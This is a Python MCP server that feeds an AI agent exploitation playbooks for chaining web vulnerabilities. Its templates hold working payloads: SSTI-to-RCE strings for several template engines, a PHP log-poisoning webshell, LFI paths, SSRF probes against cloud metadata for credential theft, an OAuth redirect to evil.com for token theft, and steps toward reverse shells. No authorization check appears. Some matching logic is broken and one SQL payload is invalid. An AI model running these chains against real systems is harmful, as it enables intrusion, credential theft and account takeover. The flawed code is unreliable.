import json
import sys
from typing import Any
from mcp.server.fastmcp import FastMCP

app = FastMCP("chainer-mcp")

CHAIN_TEMPLATES = {
    "idor_xss_ato": {
        "name": "IDOR + XSS → Account Takeover",
        "description": "Chain an IDOR vulnerability with XSS to achieve full account takeover. Use XSS to steal session cookies, then use the IDOR endpoint to access/ modify victim data.",
        "required_findings": ["IDOR", "XSS"],
        "severity_multiplier": "Critical (9.0+)",
        "chain_steps": [
            "1. Confirm XSS fires in victim's browser context (store a blind XSS payload or use Collaborator)",
            "2. Craft XSS payload that steals cookies/session tokens and exfiltrates them",
            "3. Confirm IDOR endpoint accepts the stolen session",
            "4. Use stolen session to access/modify victim's data via IDOR",
            "5. Document full HTTP request/response chain",
        ],
    },
    "ssrf_cloud_creds": {
        "name": "SSRF + Cloud Metadata → Credential Access",
        "description": "Use SSRF to query cloud metadata endpoints and extract cloud provider credentials (AWS IAM keys, Azure tokens, GCP service account keys).",
        "required_findings": ["SSRF"],
        "severity_multiplier": "Critical (9.0+)",
        "chain_steps": [
            "1. Confirm the SSRF can reach internal/cloud endpoints (use Collaborator to verify OOB)",
            "2. Try cloud metadata endpoints in order: AWS (169.254.169.254), GCP (metadata.google.internal), Azure (169.254.169.254/metadata), DO (169.254.169.254/metadata), OCI (169.254.169.254/opc/v1)",
            "3. If metadata endpoint responds, extract IAM role, access keys, tokens",
            "4. Test extracted credentials against cloud provider APIs",
            "5. Document the full exploit chain with extracted credential values",
        ],
    },
    "fileupload_lfi_rce": {
        "name": "File Upload + LFI → Remote Code Execution",
        "description": "Upload a malicious file (webshell) then use LFI to include and execute it, achieving RCE.",
        "required_findings": ["File Upload", "LFI"],
        "severity_multiplier": "Critical (9.0+)",
        "chain_steps": [
            "1. Upload a webshell file (e.g., .php, .php5, .phtml, .phar with image magic bytes)",
            "2. Note the uploaded file path from response or fuzz for common upload directories",
            "3. Use LFI to include the uploaded file: ?file=../../uploads/webshell.png",
            "4. Execute commands via webshell parameters (e.g., ?cmd=id)",
            "5. Document the full exploit chain with command output",
        ],
    },
    "sqli_xss_stored": {
        "name": "SQLi + XSS → Stored XSS in Admin Panel",
        "description": "Use SQL injection to inject an XSS payload into the database. When an admin views the affected record, the XSS executes in their browser context.",
        "required_findings": ["SQL Injection", "XSS"],
        "severity_multiplier": "Critical (8.0+)",
        "chain_steps": [
            "1. Identify a SQL injection point that writes to the database (INSERT/UPDATE)",
            "2. Craft a payload that writes XSS into a field displayed in admin panels: ' UNION UPDATE users SET bio='<script>...</script>' --",
            "3. Submit the payload to store it in the database",
            "4. When an admin views the affected record, the XSS fires (blind/stored XSS)",
            "5. Escalate: steal admin session cookie and access admin functions",
        ],
    },
    "lfi_logpoisoning_rce": {
        "name": "LFI + Log Poisoning → Remote Code Execution",
        "description": "Poison server access/error logs with PHP code via User-Agent, then use LFI to include the log file and execute the injected code.",
        "required_findings": ["LFI"],
        "severity_multiplier": "Critical (9.0+)",
        "chain_steps": [
            "1. Confirm LFI can read arbitrary files (e.g., /etc/passwd)",
            "2. Poison access logs by sending a request with PHP code in User-Agent: <?php system($_GET['cmd']); ?>",
            "3. Poison error logs by causing an error with PHP code in the request",
            "4. Use LFI to include the log file: ?file=../../var/log/apache2/access.log",
            "5. Execute commands via the poisoned log: ?file=...&cmd=id",
            "6. Document with full HTTP requests and command output",
        ],
    },
    "sqli_data_exfil": {
        "name": "SQL Injection → Full Data Exfiltration",
        "description": "Extract complete database contents via SQL injection (schema, tables, rows, credentials, PII).",
        "required_findings": ["SQL Injection"],
        "severity_multiplier": "Critical (9.0+)",
        "chain_steps": [
            "1. Confirm SQL injection type (error-based, union, blind, time-based)",
            "2. Determine number of columns via ORDER BY or UNION SELECT NULL",
            "3. Extract database version and user: SELECT version(), current_user",
            "4. List all databases: SELECT schema_name FROM information_schema.schemata",
            "5. List all tables from non-default databases",
            "6. Dump user credentials table (passwords, sessions, API keys)",
            "7. Document all extracted data (redacted if sensitive)",
        ],
    },
    "ssrf_internal_portscan": {
        "name": "SSRF → Internal Network Port Scan",
        "description": "Use SSRF to scan internal network services that are not exposed externally. Map internal services, then exploit them.",
        "required_findings": ["SSRF"],
        "severity_multiplier": "High (7.0+)",
        "chain_steps": [
            "1. Confirm SSRF can make HTTP requests to internal IPs",
            "2. Scan common internal IPs: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16",
            "3. Scan common internal ports via each discovered IP: 80, 443, 3000, 3306, 5432, 6379, 8080, 8443, 9200, 27017",
            "4. For responsive services, identify software and version from response bodies",
            "5. Look for known CVEs or default credentials on discovered services",
            "6. Document internal network map with IPs, ports, service banners",
        ],
    },
    "openredirect_oauth_token": {
        "name": "Open Redirect + OAuth → Token Theft",
        "description": "Use an open redirect to steal OAuth tokens/codes by redirecting the callback URL to an attacker-controlled server.",
        "required_findings": ["Open Redirect", "OAuth"],
        "severity_multiplier": "High (8.0+)",
        "chain_steps": [
            "1. Identify an open redirect on the target (any URL that redirects to an external domain)",
            "2. Identify the OAuth flow and locate the redirect_uri parameter",
            "3. Test if redirect_uri validation can be bypassed (path traversal, subdomain takeover, etc.)",
            "4. If direct redirect_uri change fails, use open redirect as a bypass: redirect_uri=https://target.com/redirect?url=https://evil.com",
            "5. Craft a phishing URL that initiates OAuth with redirect_uri pointing to attacker",
            "6. Collect stolen tokens and use them to access victim accounts",
        ],
    },
    "template_ssti_rce": {
        "name": "SSTI → Remote Code Execution",
        "description": "Server-Side Template Injection can lead to RCE in most template engines. Confirm engine, then escalate.",
        "required_findings": ["SSTI"],
        "severity_multiplier": "Critical (9.0+)",
        "chain_steps": [
            "1. Confirm SSTI with math expression: {{7*7}}, ${7*7}, [% 7*7 %], etc.",
            "2. Identify template engine: Jinja2, Twig, Freemarker, Velocity, Mako, Jade/Pug",
            "3. If Jinja2: {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}",
            "4. If Twig: {{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('id') }}",
            "5. If Freemarker: <#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
            "6. If Velocity: #set($x='')#$x.class.forName('java.lang.Runtime').getRuntime().exec('id')",
            "7. Execute commands to prove impact and escalate to reverse shell if possible",
        ],
    },
    "deserialization_rce": {
        "name": "Insecure Deserialization → Remote Code Execution",
        "description": "Insecure deserialization in PHP, Java, Python, Ruby, or NodeJS can lead to RCE via crafted serialized objects.",
        "required_findings": ["Deserialization"],
        "severity_multiplier": "Critical (9.0+)",
        "chain_steps": [
            "1. Identify deserialization points (PHP unserialize, Java readObject, Python pickle, Ruby Marshal, NodeJS serialize)",
            "2. PHP: Use PHPGGC to generate gadget chain payloads for common frameworks (Laravel, Symfony, WordPress, Drupal)",
            "3. Java: Use ysoserial to generate gadget chains for common libraries (CommonsCollections, fastjson, Jackson)",
            "4. Python: Craft pickle payload with __reduce__ method for command execution",
            "5. Ruby: Craft Marshal.dump payload with gadget chains for ERB/ActiveRecord",
            "6. Send payload and observe execution (time-based or OOB via Collaborator)",
            "7. Escalate to reverse shell if confirmed",
        ],
    },
    "graphql_batching_idor": {
        "name": "GraphQL Batching + IDOR → Mass Data Leak",
        "description": "Use GraphQL batching/aliasing to request multiple IDOR records in a single request, bypassing rate limits.",
        "required_findings": ["GraphQL", "IDOR"],
        "severity_multiplier": "Critical (8.0+)",
        "chain_steps": [
            "1. Identify a GraphQL endpoint and confirm introspection is enabled (query { __schema { ... } })",
            "2. Find a query that returns user/data by ID: user(id: 123) { name, email, role }",
            "3. Confirm IDOR by changing the ID and getting another user's data",
            "4. Use GraphQL aliasing to batch 50-100 ID queries in a single request",
            "5. Extract all user data (emails, roles, PII) in one request",
            "6. Document the batched query and extracted data",
        ],
    },
    "jwt_none_auth_bypass": {
        "name": "JWT None Algorithm + Weak Secret → Admin Access",
        "description": "Exploit JWT implementation flaws (alg:none, weak HMAC secret, algorithm confusion) to forge tokens and gain admin access.",
        "required_findings": ["JWT"],
        "severity_multiplier": "Critical (9.0+)",
        "chain_steps": [
            "1. Decode the JWT token (base64url decode header and payload)",
            "2. Check header for 'alg':'none', 'alg':'None', 'alg':'NONE', 'alg':'nOnE'",
            "3. Try algorithm none attack: modify header to alg:none, empty signature",
            "4. Try weak secret: crack HMAC secret with jwt_tool/john/hashcat",
            "5. Try algorithm confusion: if RS256 used, get public key and change to HS256 with public key as secret",
            "6. Try kid injection: SQLi in kid header, path traversal in kid to load arbitrary file as key",
            "7. Once forged, check if token gives admin privileges",
            "8. Document forged token and actions performed",
        ],
    },
    "subdomain_takeover_xss": {
        "name": "Subdomain Takeover → XSS/Phishing",
        "description": "Find unclaimed subdomains pointing to external services (AWS, GitHub, Heroku, Azure) and claim them to serve malicious content.",
        "required_findings": ["Subdomain Takeover"],
        "severity_multiplier": "High (8.0+)",
        "chain_steps": [
            "1. Find subdomains with unclaimed CNAMEs pointing to external services",
            "2. Register the external service at the CNAME target (if available)",
            "3. Upload malicious content (XSS payload, phishing page, or JavaScript keylogger)",
            "4. Confirm the content is served on target.com subdomain (same-origin)",
            "5. Document the takeover with CNAME record, service registration, and served content",
        ],
    },
    "prototype_pollution_xss": {
        "name": "Prototype Pollution + XSS → Universal XSS",
        "description": "Use prototype pollution to inject properties that lead to XSS in client-side libraries (jQuery, Lodash, Express, etc.).",
        "required_findings": ["Prototype Pollution", "XSS"],
        "severity_multiplier": "High (8.0+)",
        "chain_steps": [
            "1. Identify a prototype pollution vector (JSON merge, Object.assign, jQuery.extend, lodash.merge)",
            "2. Confirm pollution works: __proto__[test]=true in JSON body or query string",
            "3. Identify a gadget in client-side JS that reads the polluted property unsafely",
            "4. jQuery: __proto__[url]=javascript:alert(1) for XSS via jQuery.html",
            "5. Craft the full payload combining prototype pollution + gadget trigger",
            "6. Document with the JSON payload and JS gadget chain",
        ],
    },
    "race_condition_doublespend": {
        "name": "Race Condition → Double Spend / Abuse",
        "description": "Send multiple simultaneous requests to exploit time-of-check-to-time-of-use (TOCTOU) race conditions in financial or state-changing operations.",
        "required_findings": ["Race Condition"],
        "severity_multiplier": "High (8.0+)",
        "chain_steps": [
            "1. Identify an operation that changes state (coupon redeem, balance transfer, item purchase, like/follow)",
            "2. Send N simultaneous requests using Turbo Intruder or custom script",
            "3. Check if the operation was applied more than once (e.g., coupon used 3x but only charged once)",
            "4. Try with different timing windows and concurrency levels (5, 10, 50, 100 threads)",
            "5. If successful, document the race window, request timing, and financial impact",
        ],
    },
}


@app.tool()
def get_chain_templates() -> str:
    keys = sorted(CHAIN_TEMPLATES.keys())
    lines = [f"Available chain templates ({len(keys)}):", ""]
    for key in keys:
        t = CHAIN_TEMPLATES[key]
        lines.append(f"  {key}")
        lines.append(f"    {t['name']}")
        lines.append(f"    Requires: {', '.join(t['required_findings'])}")
        lines.append(f"    Severity: {t['severity_multiplier']}")
        lines.append("")
    return "\n".join(lines)


@app.tool()
def analyze_chains(findings_json: str) -> str:
    try:
        findings = json.loads(findings_json)
    except json.JSONDecodeError as e:
        return f"Error: Invalid findings JSON: {e}"

    if not findings:
        return "No findings provided for chain analysis."

    finding_classes = set()
    finding_details = {}
    for f in findings:
        cls = f.get("vulnerability_class", f.get("class", "UNKNOWN")).upper()
        finding_classes.add(cls)
        endpoint = f.get("affected_endpoint", f.get("endpoint", "unknown"))
        confidence = f.get("confidence", "MEDIUM")
        if cls not in finding_details:
            finding_details[cls] = []
        finding_details[cls].append({"endpoint": endpoint, "confidence": confidence})

    matched_chains = []
    for key, template in sorted(CHAIN_TEMPLATES.items()):
        required = set(template["required_findings"])
        cls_upper = set()
        for fc in finding_classes:
            cls_upper.add(fc.upper())
        if required.issubset(cls_upper):
            severity = template["severity_multiplier"]
            matched_chains.append({"key": key, "template": template, "severity": severity})

    if not matched_chains:
        single_findings = []
        for cls in sorted(finding_classes):
            single_findings.append(cls)
        lines = [
            "No multi-step chains possible with current findings.",
            "",
            "Individual findings present:",
        ]
        for cls in sorted(finding_classes):
            details = finding_details.get(cls, [])
            for d in details:
                lines.append(f"  - {cls} at {d['endpoint']} [{d['confidence']}]")
        lines += [
            "",
            "Consider standalone exploitation of individual findings.",
            "Use plan_chain tool for single-finding escalation strategies.",
        ]
        return "\n".join(lines)

    lines = [f"Found {len(matched_chains)} chainable combination(s):", ""]
    for mc in matched_chains:
        t = mc["template"]
        lines.append(f"  ┌─ Chain: {t['name']}")
        lines.append(f"  ├─ Key: {mc['key']}")
        lines.append(f"  ├─ Severity: {t['severity_multiplier']}")
        lines.append(f"  ├─ Required: {', '.join(t['required_findings'])}")
        lines.append(f"  ├─ Available:")
        for req in t["required_findings"]:
            details = finding_details.get(req.upper(), finding_details.get(req, []))
            for d in details:
                lines.append(f"  │    {req} at {d['endpoint']} [{d['confidence']}]")
        lines.append(f"  └─ Use: plan_chain('{mc['key']}', findings_json)")
        lines.append("")

    lines.append("Tip: Use plan_chain('<chain_key>', findings_json) for detailed exploitation steps.")
    return "\n".join(lines)


@app.tool()
def plan_chain(chain_key: str, findings_json: str) -> str:
    if chain_key not in CHAIN_TEMPLATES:
        keys = sorted(CHAIN_TEMPLATES.keys())
        return f"Error: Unknown chain '{chain_key}'. Available: {', '.join(keys)}"

    template = CHAIN_TEMPLATES[chain_key]

    try:
        findings = json.loads(findings_json) if findings_json else []
    except json.JSONDecodeError as e:
        return f"Error: Invalid findings JSON: {e}"

    finding_classes = set()
    finding_endpoints = {}
    for f in findings:
        cls = f.get("vulnerability_class", f.get("class", "UNKNOWN")).upper()
        finding_classes.add(cls)
        endpoint = f.get("affected_endpoint", f.get("endpoint", "unknown"))
        param = f.get("parameter", f.get("param", ""))
        payload = f.get("payload", f.get("poc", ""))
        confidence = f.get("confidence", "MEDIUM")
        if cls not in finding_endpoints:
            finding_endpoints[cls] = []
        finding_endpoints[cls].append({
            "endpoint": endpoint,
            "parameter": param,
            "payload": payload,
            "confidence": confidence,
        })

    required = set(template["required_findings"])
    cls_upper = set()
    for fc in finding_classes:
        cls_upper.add(fc.upper())
    missing = required - cls_upper

    lines = [
        f"╔══ Chain Plan: {template['name']} ═══",
        f"║",
        f"║ Description: {template['description']}",
        f"║ Expected Severity: {template['severity_multiplier']}",
        f"║",
    ]

    if missing:
        lines.append(f"║ ⚠ Missing required finding(s): {', '.join(sorted(missing))}")
        lines.append(f"║   The chain may still work if these are present but not in findings list.")
    else:
        lines.append(f"║ ✅ All required findings present")
        for req in required:
            details = finding_endpoints.get(req.upper(), finding_endpoints.get(req, []))
            for d in details:
                lines.append(f"║    • {req} → {d['endpoint']} [{d['confidence']}]")

    lines += [
        f"║",
        f"║ Steps to execute:",
    ]
    for step in template["chain_steps"]:
        lines.append(f"║   {step}")

    lines.append(f"║")
    lines.append(f"║ Tools needed:")
    lines.append(f"║   • Burp Repeater (for manual request crafting)")
    lines.append(f"║   • Burp Collaborator (for OOB detection)")
    lines.append(f"║   • sqlmap-mcp (for SQLi data exfiltration)")
    lines.append(f"║   • memory-mcp (to save chain results)")
    lines.append(f"║")

    lines.append(f"║ When complete, save with save_chain()")
    lines.append(f"╚══ End Chain Plan ═══")

    return "\n".join(lines)


@app.tool()
def save_chain(chain_json: str) -> str:
    try:
        chain = json.loads(chain_json)
    except json.JSONDecodeError as e:
        return f"Error: Invalid chain JSON: {e}"

    required = ["chain_type", "findings", "steps_taken", "outcome", "severity"]
    missing = [r for r in required if r not in chain]
    if missing:
        return f"Error: Missing required fields: {', '.join(missing)}"

    chain_type = chain["chain_type"]
    if chain_type not in CHAIN_TEMPLATES:
        return f"Warning: Unknown chain type '{chain_type}'. Saving anyway."

    template = CHAIN_TEMPLATES.get(chain_type, {})
    chain_name = template.get("name", chain_type)

    lines = [
        f"Chain saved: {chain_name}",
        f"  Type: {chain_type}",
        f"  Severity: {chain['severity']}",
        f"  Outcome: {chain['outcome']}",
        f"  Steps:",
    ]
    for i, step in enumerate(chain.get("steps_taken", []), 1):
        lines.append(f"    {i}. {step}")
    lines.append("")
    lines.append("To persist across hunts, use memory-mcp: remember_chain()")

    return "\n".join(lines)


@app.tool()
def suggest_next_tool(findings_json: str, current_phase: str = "") -> str:
    try:
        findings = json.loads(findings_json) if findings_json else []
    except json.JSONDecodeError as e:
        return f"Error: Invalid findings JSON: {e}"

    finding_classes = set()
    for f in findings:
        cls = f.get("vulnerability_class", f.get("class", "")).upper()
        if cls:
            finding_classes.add(cls)

    suggestions = []

    if "XSS" in finding_classes and "IDOR" not in finding_classes:
        suggestions.append("Look for IDOR endpoints while XSS is active — chain for account takeover")
    if "SSRF" in finding_classes:
        suggestions.append("Probe cloud metadata endpoints via SSRF: 169.254.169.254")
        suggestions.append("Use SSRF to scan internal network ports")
    if "LFI" in finding_classes:
        suggestions.append("Try log poisoning via User-Agent header for RCE")
        suggestions.append("Try PHP wrappers: php://filter/convert.base64-encode/resource=config.php")
    if "SQL Injection" in finding_classes or "SQLI" in finding_classes:
        suggestions.append("Extract database schema and user credentials tables")
        suggestions.append("Try --os-shell for RCE if database user has FILE privilege")
    if "SSTI" in finding_classes:
        suggestions.append("Escalate SSTI to RCE using engine-specific gadget chains")
    if "JWT" in finding_classes:
        suggestions.append("Test alg:none, weak HMAC secret, and algorithm confusion attacks")
    if "GraphQL" in finding_classes or "GRAPHQL" in finding_classes:
        suggestions.append("Test introspection query: query { __schema { types { name } } }")
        suggestions.append("Check for batching/aliasing abuse with IDOR")
    if "File Upload" in finding_classes or "FILE UPLOAD" in finding_classes:
        suggestions.append("Upload PHP webshell with image magic bytes, then use LFI to include")
        suggestions.append("Try extension bypasses: .php5, .phtml, .phar, .shtml")
    if "Race Condition" in finding_classes or "RACE CONDITION" in finding_classes:
        suggestions.append("Test financial operations with Turbo Intruder at 50+ concurrency")
    if "Prototype Pollution" in finding_classes or "PROTOTYPE POLLUTION" in finding_classes:
        suggestions.append("Find client-side gadget chains in jQuery/Lodash for universal XSS")

    if not suggestions:
        if finding_classes:
            suggestions.append(f"Findings: {', '.join(sorted(finding_classes))}")
            suggestions.append("Run deeper scans to find more vulnerability classes for chaining")
        else:
            suggestions.append("No findings yet. Complete recon and scanning first.")

    lines = ["Next tool suggestions:", ""]
    for s in suggestions:
        lines.append(f"  → {s}")

    return "\n".join(lines)


if __name__ == "__main__":
    print("chainer-mcp starting...", file=sys.stderr)
    app.run(transport="stdio")
